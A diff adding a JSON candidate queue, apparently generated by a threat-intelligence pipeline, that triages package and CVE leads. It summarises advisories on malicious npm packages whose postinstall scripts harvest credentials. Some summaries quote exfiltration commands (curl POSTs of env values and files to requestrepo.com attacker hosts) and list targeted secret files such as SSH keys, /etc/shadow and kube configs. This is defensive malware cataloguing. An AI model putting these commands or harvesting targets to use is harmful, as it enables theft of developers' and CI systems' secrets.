@@ -1,0 +1,2771 @@
+{
+  "schema_version": "threatpedia-supply-chain-candidate-queue/1",
+  "generated_at": "2026-06-24T16:40:11.723Z",
+  "mode": "live",
+  "drafting_enabled": false,
+  "auto_drafting_allowed": false,
+  "queue_action": "candidate_review_only",
+  "boundaries": {
+    "no_auto_drafting": true,
+    "no_corpus_import": true,
+    "no_article_tasks_created": true,
+    "grounded_drafting_required_before_dispatch": true
+  },
+  "config": {
+    "current_window_days": 180,
+    "since_hours": 6,
+    "max_per_source": 25,
+    "max_candidates": 40,
+    "min_rank": 25,
+    "enabled": true,
+    "queue_path": ".github/pipeline/supply-chain-candidates/latest.json"
+  },
+  "summary": {
+    "raw_leads_loaded": 240,
+    "deduped_subjects": 220,
+    "rejected_low_relevance": 80,
+    "classifier_candidates": 140,
+    "candidates_emitted": 40,
+    "candidates_carried_forward": 0,
+    "current_candidates": 40,
+    "matched_existing": 2,
+    "collector_errors": 0
+  },
+  "currency": {
+    "latest_corpus_incident_at": "2026-05-28T00:00:00.000Z",
+    "latest_discovery_signal_at": "2026-06-24T16:16:22.129Z",
+    "pending_candidate_count": 40,
+    "pending_current_count": 40,
+    "graph_latest_reflects": "discovery"
+  },
+  "feed_cursors": {
+    "go": {
+      "cursor": "2026-06-24T10:40:24.094196Z",
+      "boundary_keys": [
+        "github.com/daptin/daptin\tv0.12.25\t2026-06-24T10:40:24.094196Z"
+      ]
+    }
+  },
+  "collector_errors": [],
+  "rejected": [
+    {
+      "canonicalSubjectId": "pkg:npm/metamask-previews/approval-controller@3.5.0-preview.d32a7cc",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:3d2c4becfeee"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/tyravel/redis@0.9.1",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:6350388f6d72"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/glideapps/uapi@2.0.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:ea71b332c53d"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/symforge@8.8.4",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:4fd7713e1dd8"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/metamask-previews/app-metadata-controller@0.0.0-preview-8365901",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:6d8cbcb3612b"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/glideapps/ts-necessities@2.4.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:286de4182d38"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/tyravel/database-pg@0.9.1",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:21b403761c4f"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/glideapps/ts-helper@6.0.1",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:142c4f82fa16"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/webirr@2.0.2",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:7615362d7ebc"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/symforge-macos-arm64@8.8.4",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:20bbb276e608"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/hd-team/app-dnpkg-beta@1.0.20260625002500",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:8fe7dd23f252"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/car-runtime@0.30.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:b0868388b438"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/metamask-previews/announcement-controller@4.0.0-preview.d32a7cc",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:ec63ff093331"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/tyravel/database-mysql@0.9.1",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:d806c608ac3f"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/firestitch/report@18.0.1",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:2919a3ab29ab"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/tyravel/database@0.10.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:2e39d319a1cb"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/metamask-previews/analytics-data-regulation-controller@0.0.0-preview-52f4a2ca",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:5f6a85e3cfd5"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/glideapps/vitest-v8-json-coverage-summary@0.0.0-quebec",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:16f24a9832c1"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/symforge-macos-x64@8.9.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:678eff9ebdd1"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/metamask-previews/analytics-controller@0.0.0-preview-b8454d32",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:135aa93d22b4"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/glideapps/tables@1.0.21",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:d53c1b35793b"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/tyravel/validation@0.10.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:d7a21c98cf9f"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/snk-rich-text-editor@0.0.2",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:0f34cd8b8fc0"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/graphql-hive/gateway@2.9.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:58c120a8d40d"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:npm/glideapps/screen-agent@0.0.3-beta05",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "npm-registry:9d249cad5365"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform/internal/backend/remote-state/azure@v0.0.0-20260624103449-178e8feae4bc",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:bc3623ef309f"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/labring/sealos/controllers/node@v0.0.0-20260624100150-8b7472d94f75",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:8f7eb21ac192"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/stackrox/stackrox/tools/check-workflow-run@v0.0.0-20260624102022-49da00a2f245",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:231336c8ef9c"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/wso2/carbon-apimgt@v6.8.103%2Bincompatible",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:c5156eeba432"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/xmtp/proto/grpc/go@v1.3.0-20260618223123-e61687448568.3",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:cb3a4bb1d041"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/apache/pdfbox@v0.0.0-20260624065425-833ed8f378f0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:bb19d4633b19"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform/internal/backend/remote-state/gcs@v0.0.0-20260624103449-178e8feae4bc",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:219890e0c337"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform/internal/legacy@v0.0.0-20260624103449-178e8feae4bc",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:1d4986d4adcd"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/hashicorp/terraform/internal/backend/remote-state/oss@v0.0.0-20260624103449-178e8feae4bc",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:bf2e4d1f6264"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/angr/angr@v0.0.0-20260624004745-b61879f7499c",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:6e268d690bc2"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/home-assistant/ios@v0.0.0-20260624101432-02b38d1b5060",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:8291155fbd93"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.1.4",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:e297cc3dafb3"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/infracost/vcs@v0.4.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:6ef359896700"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/apache/ozone@v0.0.0-20260624095423-182aaa77994e",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:55ba20f3485a"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.3.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:b8f0241aa3a5"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.1.3",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:6050dd530ce2"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/grafana/grafana/pkg/util/sqlite@v0.0.0-20260624103413-675c35e9e908",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:5cd41ac220ab"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/grafana/grafana/pkg/storage/unified/resourcepb@v0.0.0-20260624103413-675c35e9e908",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:aaee868115b9"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/apache/iggy/examples/go@v0.0.0-20260624093800-73251f3abc49",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:56dccb0c6d49"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/apache/nifi@v0.0.0-20260624074359-eae30cdcaa42",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:4561aea11744"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/buf.build/gen/go/xmtp/proto/grpc/go@v1.2.0-20260618223123-e61687448568.1",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:edfd48f97af7"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.3.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:da96c832c7fc"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/mlupine/terraform-provider-pagerdutync@v1.7.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:50ac9a6506b7"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/rtxnik/workspace-cli@v0.6.0",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:5c6218142448"
+      ]
+    },
+    {
+      "canonicalSubjectId": "pkg:golang/github.com/daptin/daptin@v0.12.25",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "go-index:21d3ae193c6f"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2023-28769",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2023-28769"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2022-45440",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2022-45440"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-15069",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-15069"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-29574",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-29574"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-1597",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-1597"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-10392",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-10392"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2023-23897",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2023-23897"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-21894",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-21894"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-9910",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-9910"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-51567",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-51567"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-9870",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-9870"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-51568",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-51568"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-51378",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-51378"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-9161",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-9161"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-20481",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-20481"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-47575",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-47575"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-38816",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-38816"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-11900",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-11900"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2023-20263",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2023-20263"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2024-38094",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2024-38094"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2023-7289",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2023-7289"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2023-7291",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2023-7291"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2023-7293",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2023-7293"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2017-20194",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2017-20194"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-36842",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-36842"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2016-15042",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2016-15042"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-36831",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-36831"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-36834",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-36834"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2021-4444",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2021-4444"
+      ]
+    },
+    {
+      "canonicalSubjectId": "CVE-2020-36832",
+      "reason": "not_supply_chain_relevant",
+      "mergedLeadRefs": [
+        "vulncheck-kev:CVE-2020-36832"
+      ]
+    }
+  ],
+  "candidates": [
+    {
+      "candidateId": "SC-CAND-ed6284dc16b40d22",
+      "canonicalSubjectId": "GHSA-J29F-62X7-HJ66",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in date-format-helper2 (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (66c1775ce65ad47476ee1a0f1c7c5373e61466ec3eb4543cc658e67d2de22960) Package is advertised as a React date-formatting utility, but its postinstall.js performs targeted credential harvesting on npm install. The script reads Coze workload identity environment variables (COZE_WORKLOAD_API_TOKEN, COZE_WORKLOAD_IDENTITY_CLIENT_ID, COZE_WORKLOAD_IDENTITY_CLIENT_SECRET, COZE_WORKLOAD_IDENTITY_TOKEN_ENDPOINT, COZE_PROJECT_SPACE_ID), uses them to mint OAuth access tokens via three grant types (client_credentials, token-exchange, and a JSON body variant) against the configured token endpoint, enumerates ~30 Coze API paths against api.coze.cn / integration.coze.cn / api.coze.com using the minted tokens, and POSTs the env values, the issued tokens, and the API responses over plaintext HTTP to http://2e3bkumw.requestrepo.com — a public request-capture sinkhole controlled by the attacker. The advertised date-helper functionality in index.js is unrelated cover for the install-time credential theft. An installer running `npm install` in CI or a developer environment with Coze credentials in scope would have their workload identity stolen and the attacker could impersonate that workload against Coze APIs. ## Source: ghsa-malware (a13b8fd2717f710497955f390bdf36a5b52abda37b7f3bd47f737f98bfbbb5b4) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory",
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6301",
+        "https://github.com/advisories/GHSA-j29f-62x7-hj66"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-j29f-62x7-hj66",
+        "osv:MAL-2026-6301"
+      ],
+      "firstSeenAt": "2026-06-23T15:21:06.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:31:25.453Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:31:25.453Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-d937e144c2fd20d0",
+      "canonicalSubjectId": "GHSA-9P56-XFQ3-77X5",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in react-simple-utils-kit (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (038aa6bccd8008fec1f309d718e53dd4b89e4ca15a976c6a80652e0dd58a5b58) Package advertises itself as 'a simple date formatting utility for React projects' (3-function index.js), but ships a postinstall.js that runs on every `npm install` and performs an extensive reconnaissance + credential-harvest sweep against the installer's host, POSTing each result over plain HTTP to a hardcoded attacker endpoint at http://2e3bkumw.requestrepo.com (a one-shot request-interception domain unrelated to any legitimate publisher). postinstall.js:8 hardcodes `const BURL = 'http://2e3bkumw.requestrepo.com'` and postinstall.js:16 invokes `execSync(\\`curl -s -m 8 -X POST -d @${tmpFile} ${BURL}/${key}...\\`)` to ship results. Collected data includes: process capabilities and ptrace scope, strace attach against PID 2, raw memory reads of another process via `xxd /proc/2/mem`, that process's environment block via `cat /proc/2/environ` (commonly containing CI tokens and cloud credentials), `/proc/2/cmdline`, `ps aux`, listening-port enumeration, MCP probing on localhost:9000, and raw-disk reads from `/dev/vdb`. The package's name targets React developers via a date-utility cover story (empty author field, Chinese comment `绕过能力探测` = 'capability-detection bypass'); none of this behavior is consistent with the advertised purpose. Installer harm is concrete and immediate: any host running `npm install react-simple-utils-kit` leaks process-tree secrets, environment variables of other running processes, kernel/container introspection data, and raw block-device contents to attacker infrastructure. ## Source: ghsa-malware (29295ef35aa59796f637df779516a0382cbe1ce88e69a5c9f40012d9e63c9cfd) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory",
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6303",
+        "https://github.com/advisories/GHSA-9p56-xfq3-77x5"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-9p56-xfq3-77x5",
+        "osv:MAL-2026-6303"
+      ],
+      "firstSeenAt": "2026-06-23T14:46:34.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:31:25.229Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:31:25.229Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-84fd7c55604b73e6",
+      "canonicalSubjectId": "GHSA-M55J-V4CF-P5W5",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in react-campaign-optimizer (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (a040ca9a32fe68e08906bdc58b7ae907b8f8092acd9764266de15004b3922e9f) On `npm install`, the package runs `node postinstall.js` (declared in package.json `scripts.postinstall`) which performs unauthenticated, unconsented exfiltration to the hardcoded attacker endpoint `https://2e3bkumw.requestrepo.com`. The script collects and POSTs: full `process.env` (line 60), hostname and host metadata (`os.hostname()`, network interfaces, routes, ARP, DNS config, /etc/hosts, ps/netstat/lsof output), and the contents of canonical credential files including `/root/.ssh/id_rsa`, `~/.ssh/authorized_keys`, `/etc/shadow`, `/root/.kube/config`, `/root/.docker/config.json`, `/root/.npmrc`, `/root/.gitconfig`, `/root/.bash_history`, and the in-pod Kubernetes ServiceAccount token at `/var/run/secrets/kubernetes.io/serviceaccount/token`. It additionally probes cloud-metadata IPs (169.254.169.254, 100.100.100.200, 169.254.0.23) for IAM credentials and TCP-scans local /24 ranges for service ports (SSH, MySQL, Redis, Docker API 2375, etcd 2379, K8s API, Prometheus, Grafana), shipping results to the same callback. The package presents itself as a React ad-campaign optimization utility (description, keywords `baidu`/`sem`/`ppc`) but ships no React or ad-tech code — `index.js` is unrelated and the postinstall payload is a Baidu-infrastructure-targeted recon/credential-theft script (header comment: `百度基础设施 SSRF 探测`). The 'authorized security testing' self-label is not consent: the package is published publicly on npm and fires for any installer. Any CI runner, developer machine, or container that installs this package leaks SSH private keys, kube credentials, npm publish tokens, K8s ServiceAccount tokens, and cloud IAM metadata to the attacker. ## Source: ghsa-malware (026137182a42d12b815aad9476d92769953101cb32a88c4a5329ca9318a6bb35) Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.",
+      "sources": [
+        "github-advisory",
+        "osv"
+      ],
+      "sourceRefs": [
+        "https://osv.dev/vulnerability/MAL-2026-6395",
+        "https://github.com/advisories/GHSA-m55j-v4cf-p5w5"
+      ],
+      "mergedLeadRefs": [
+        "github-advisory:GHSA-m55j-v4cf-p5w5",
+        "osv:MAL-2026-6395"
+      ],
+      "firstSeenAt": "2026-06-24T14:06:51.000Z",
+      "lastMaterialActivityAt": "2026-06-24T15:31:24.921Z",
+      "activityBasis": [
+        "advisory_updated",
+        "active_exploitation_or_malware_signal"
+      ],
+      "entityMatch": "new",
+      "matchedEntityHints": {
+        "actors": [],
+        "campaigns": [],
+        "packages": [],
+        "malwareFamilies": []
+      },
+      "classification": {
+        "leadClass": "current",
+        "leadClassReason": "active status exploited_in_wild; material activity within 180 days",
+        "workIntent": "create_article",
+        "routingPriority": "p0",
+        "effectiveActiveStatus": "exploited_in_wild",
+        "activeStatus": "exploited_in_wild",
+        "activeStatusExpiresAt": "2026-07-24T15:31:24.921Z",
+        "needsReverify": false,
+        "kevStatusDerived": null,
+        "kevStatusIsAuthoredTruth": false,
+        "manualOverrideValid": false,
+        "manualOverrideErrors": []
+      },
+      "rank": 71,
+      "rankReasons": [
+        "current lead",
+        "active exploitation or malware signal",
+        "advisory database signal",
+        "supply-chain term match"
+      ],
+      "queueAction": "candidate_review",
+      "draftingAllowed": false,
+      "autoDraftingBlockedReason": "B1 discovery/classification stops at candidate queue; B2 grounded drafting requires explicit approval, source-packet preflight, and fidelity check."
+    },
+    {
+      "candidateId": "SC-CAND-92458d52e28083dd",
+      "canonicalSubjectId": "MAL-2026-6392",
+      "subjectType": "incident",
+      "proposedArchetype": "incident",
+      "title": "Malicious code in cccmyssr3 (npm)",
+      "summary": "--- _-= Per source details. Do not edit below this line.=-_ ## Source: amazon-inspector (a15e77975be346fa9b834e50124784a6774b5385e47072ae80911f5eda92cabf) On `npm install`, this package automatically runs postinstall.js, which executes `curl -X POST` with a body containing the installer's hostname (`$(hostname)`), current user (`$(whoami)`), and the first 10 environment variables base64-encoded (`$(env | head -10 | base64 -w 0)`), sending them over plain HTTP to http://r1x55270.requestrepo.com — a requestrepo.com subdomain used as an attacker data-collection endpoint. Environment variables on developer and CI machines routinely contain credentials, API tokens, and CI secrets, so this is a credential-theft payload. The package's `main` is a trivial one-line `formatDate` stub and its description is 'A harmless utility package' — a cover story unrelated to the lifecycle behavior.",
+      "sources": [
